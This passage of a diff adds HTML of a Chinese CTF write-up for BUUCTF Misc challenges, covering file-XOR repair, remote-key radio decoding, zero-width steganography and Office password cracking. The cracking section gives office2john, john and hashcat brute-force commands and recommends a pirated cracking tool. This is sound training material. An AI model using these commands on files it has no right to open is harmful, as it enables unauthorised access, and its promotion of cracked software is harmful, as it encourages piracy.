+    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0b&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[::&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;s1 = s1[::-1]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;print(n2s(int(s1,2)))
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;# 23834ec4b5e6b6ef5db48145a0596046
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;m = &amp;#39;23834ec4b5e6b6ef5db48145a0596046&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;#这里的写法也是一样的道理，要逆序两次，才能和第一种写法一样。
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;print(m[::-1])
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;flag{6406950a54184bd5fe6b6e5b4ce43832}&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;font-color0288d1actf新生赛2020musicfont&#34;&gt;&lt;font color=#0288D1&gt;【ACTF新生赛2020】music&lt;/font&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;font-colora020f0知识点mp4文件头文件异或font&#34;&gt;&lt;font color=#A020F0&gt;知识点：mp4文件头，文件异或&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;mp4(.m4a)：文件头信息为（0000 0018 6674 7970 6973 6f35 0000 0200）&lt;/p&gt;
+&lt;p&gt;文件异或：将文件进行异或操作即可&lt;/p&gt;
+&lt;h3 id=&#34;font-colora020f0题目分析font-4&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;打开vip.m4a 文件提示文件损坏，打开010editor查看，发现文件头中有大量的 A1 ，将源文件与 A1进行异或。&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;010 Editor&lt;/code&gt;在 &lt;code&gt;工具 -&amp;gt; 十六进制运算 -&amp;gt; 二进制异或&lt;/code&gt; 对整个文件内容进行异或&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210629192355393.png&#34; alt=&#34;image-20210629192355393&#34;&gt;&lt;/p&gt;
+&lt;p&gt;修复文件后，打开录音得到：actfabcdfghijk&lt;/p&gt;
+&lt;p&gt;flag{abcdfghijk}&lt;/p&gt;
+&lt;h2 id=&#34;font-color0288d1sctf2019电单车font&#34;&gt;&lt;font color=#0288D1&gt;【SCTF2019】电单车&lt;/font&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;font-colora020f0知识点无线电pt224xfont&#34;&gt;&lt;font color=#A020F0&gt;知识点：无线电PT224x&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;参考文章：http://www.kb-iot.com/post/756.html&lt;/p&gt;
+&lt;p&gt;钥匙信号(PT224X) = 同步引导码(8bit) + 地址位(20bit) + 数据位(4bit) + 停止码(1bit)&lt;/p&gt;
+&lt;p&gt;钥匙信号(PT226X) = 同步引导码(4bit) + 地址位(8bit) + 数据位(4bit) + 停止码(1bit)&lt;/p&gt;
+&lt;h3 id=&#34;font-colora020f0题目分析font-5&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;使用 AudaCity 打开题目给的 .WAV 文件 ，得到一串音频文件，转化成二进制数据：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0  0111010010101010011000100  011101001010101001100010
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过捕获的数据分析可知前20位就是地址为 &lt;code&gt;01110100101010100110&lt;/code&gt;  ,地址码后面的5位是数据位和停止位&lt;code&gt;00100&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210629225829655.png&#34; alt=&#34;image-20210629225829655&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag{01110100101010100110}&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;font-color0288d1hashcatfont&#34;&gt;&lt;font color=#0288D1&gt;hashcat&lt;/font&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;font-colora020f0知识点hashcat破解密码font&#34;&gt;&lt;font color=#A020F0&gt;知识点：hashcat破解密码&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;工具1：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Hashcat 是世界上最快的密码破解程序，是一个支持多平台、多算法的开源的分布式工具。(&lt;font color=#0288D1&gt;kali最新版自带&lt;/font&gt;)&lt;/p&gt;
+&lt;p&gt;官方：&lt;a href=&#34;https://hashcat.net/hashcat/&#34;&gt;&lt;font color=#0288D1&gt;https://hashcat.net/hashcat/&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Github：&lt;a href=&#34;https://github.com/hashcat/hashcat&#34;&gt;&lt;font color=#0288D1&gt;https://github.com/hashcat/hashcat&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;工具2：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Accent OFFICE Password Recovery v5.1 CracKed By Hmily 进行破解&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;工具3：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;office2john.py 破解&lt;/p&gt;
+&lt;p&gt;Github 项目地址 &lt;a href=&#34;https://github.com/openwall/john&#34;&gt;&lt;font color=#0288D1&gt;https://github.com/openwall/john&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;注意：在win下安装的话还需要安装 john ，而kali自带 john（推荐安装在kali使用）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;学习文章：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.sqlsec.com/2019/10/hashcat.html#toc-heading-25&#34;&gt;&lt;font color=#0288D1&gt;推荐学习：国光师傅的HashCat学习笔记&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://wooyun.js.org/drops/GPU%E7%A0%B4%E8%A7%A3%E7%A5%9E%E5%99%A8Hashcat%E4%BD%BF%E7%94%A8%E7%AE%80%E4%BB%8B.html&#34;&gt;&lt;font color=#0288D1&gt;GPU破解神器Hashcat使用简介&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://zodream.cn/blog/id/118.html&#34;&gt;&lt;font color=#0288D1&gt;Hashcat 找回office文件密码&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=hashcat&#34;&gt;&lt;font color=#0288D1&gt;HashCat官方文档&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;font-colora020f0题目分析font-6&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;打开题目后，使用010editor查看，可知文件头为 D0 CF 11 E0,文件为 xls,doc,ppt类型的。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210630180949454.png&#34; alt=&#34;image-20210630180949454&#34;&gt;&lt;/p&gt;
+&lt;p&gt;添加后缀名 .ppt ,打开后需要输入密码解密。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;方法一：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;使用Accent OFFICE Password Recovery v5.1 CracKed By Hmily 进行破解，使用暴力破解。选择4位的数字进行攻击。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210630181620393.png&#34; alt=&#34;image-20210630181620393&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210630181755458.png&#34; alt=&#34;image-20210630181755458&#34;&gt;&lt;/p&gt;
+&lt;p&gt;得到密码 9919,打开 ppt后，在倒数第二幅图中，将背景换个深色，得到flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210630182011550.png&#34; alt=&#34;image-20210630182011550&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;方法二：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;使用最强密码破解工具 HashCat ,kali最新版自带。&lt;/p&gt;
+&lt;p&gt;在使用 Hashcat前，需要先在kali上 clone github上的 office2john.py 程序,使用 office2john.py 来获取文件的hash值，再利用 HashCat 破解 hash值，拿到密码。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#抓取文件的hash值,并保存为 out.txt 文件&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;python3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;N1nja_Misc_tools&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;crack_hash&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;office2john&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xlsx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210630185513007.png&#34; alt=&#34;image-20210630185513007&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#文件的hash值,保存在out.txt文件&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;office&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2010&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100000&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;265&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c4784621f00ddb85cc3a7227dade7&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f0cc4179b2fcc2a2c5fa417566806249&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b5ad5b66c0b84ba6e5d01f27ad8cffbdb409a4eddc4a87cd4dfbc46ad60160c9&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;准备一个好用的字典（zidian.txt）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;john&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordlist&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zidian&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;破解成功后，使用下面命令查看爆破的密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;john&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;--------------------------------------------------------------------------------------&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font color=#0288D1&gt;下面的方法是使用 Hashcat 来破解hash值&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#-m 破解hash类型&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#-a 破解模式(这里是蛮力破解)&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#?d?d?d?d 使用数字攻击,代表4位的数字&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;hashcat&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9500&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;status.....................................Cracked显示已经获得了密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210630193612155.png&#34; alt=&#34;image-20210630193612155&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#我们使用&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;hashcat&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9500&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#来查看密码&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#可以看到密码为:9919&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210630193825762.png&#34; alt=&#34;image-20210630193825762&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210630192437004.png&#34; alt=&#34;image-20210630192437004&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;font-color0288d1utctf2020zerofont&#34;&gt;&lt;font color=#0288D1&gt;【UTCTF2020】zero&lt;/font&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;font-colora020f0知识点零宽字符隐写font&#34;&gt;&lt;font color=#A020F0&gt;知识点：零宽字符隐写&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;参考文章：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/87919817&#34;&gt;&lt;font color=#0288D1&gt;转化为二进制的加密&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/75992161&#34;&gt;&lt;font color=#0288D1&gt;转化为Morse编码的加密&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;零宽字符&lt;/strong&gt; ：字节宽度为0的特殊字符&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;字符包括：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;零宽度空格符 (zero-width space) ：U+200B&lt;/th&gt;
+&lt;th&gt;用于较长单词的换行分隔&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;零宽度非断空格符 (zero width no-break space) &lt;strong&gt;：U+FEFF&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;用于阻止特定位置的换行分隔&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;零宽度连字符 (zero-width joiner) &lt;strong&gt;：U+200D&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;用于阿拉伯文与印度语系等文字中，使不会发生连字的字符间产生连字效果&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;零宽度断字符 (zero-width non-joiner) &lt;strong&gt;：U+200C&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;用于阿拉伯文,德文,印度语系等文字中，阻止会发生连字的字符间的连字效果&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;左至右符 (left-to-right mark) &lt;strong&gt;：U+200E&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;用于在混合文字方向的多种语言文本中（例：混合左至右书写的英语与右至左书写的希伯来语），规定排版文字书写方向为左至右&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;右至左符 (right-to-left mark) &lt;strong&gt;：U+200F&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;用于在混合文字方向的多种语言文本中，规定排版文字书写方向为右至左&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;在线加解密网站：（加解密只能使用同一种方式或在同一个网站）&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://330k.github.io/misc_tools/unicode_steganography.html&#34;&gt;&lt;font color=#0288D1&gt;http://330k.github.io/misc_tools/unicode_steganography.html&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://yuanfux.github.io/zero-width-web/&#34;&gt;&lt;font color=#0288D1&gt;https://yuanfux.github.io/zero-width-web/&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://www.atoolbox.net/Tool.php?Id=829&#34;&gt;&lt;font color=#0288D1&gt;http://www.atoolbox.net/Tool.php?Id=829&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;其他工具&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;zwsp-steg-py&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/enodari/zwsp-steg-py&#34;&gt;&lt;font color=#0288D1&gt;https://github.com/enodari/zwsp-steg-py&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;github项目&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/yuanfux/zero-width-lib&#34;&gt;&lt;font color=#0288D1&gt;https://github.com/yuanfux/zero-width-lib&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/rover95/morse-encrypt&#34;&gt;&lt;font color=#0288D1&gt;https://github.com/rover95/morse-encrypt&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;font-colora020f0题目分析font-7&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;题目提示 zero，打开文本后我还以为是凯撒移位，爆破了下发现不行，回过头看题目不明白 zero有什么含义。查了资料后知道这里考的是&lt;strong&gt;零宽字符隐写&lt;/strong&gt; 。&lt;/p&gt;
+&lt;p&gt;加解密时只能使用相同的方式，即使用同一种加密方式解密，或者在同一网站加解密。这里只能在 &lt;a href=&#34;http://330k.github.io/misc_tools/unicode_steganography.html&#34;&gt;&lt;font color=#0288D1&gt;http://330k.github.io/misc_tools/unicode_steganography.html&lt;/font&gt;&lt;/a&gt; 这个网站解出flag&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag{whyNOT@sc11_4927aajbqk14}&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;font-color0288d1ctf2019otakufont&#34;&gt;&lt;font color=#0288D1&gt;【*CTF2019】otaku&lt;/font&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;font-colora020f0知识点伪加密word隐写图片隐写font&#34;&gt;&lt;font color=#A020F0&gt;知识点：伪加密,word隐写,图片隐写&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;伪加密：直接使用360压缩打开（无视伪加密）或者使用 binwalk 分离&lt;/p&gt;
+&lt;p&gt;word隐写： &lt;a href=&#34;https://blog.csdn.net/q_l_s/article/details/53813971&#34;&gt;&lt;font color=#0288D1&gt;Word文字的三种隐藏方法&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
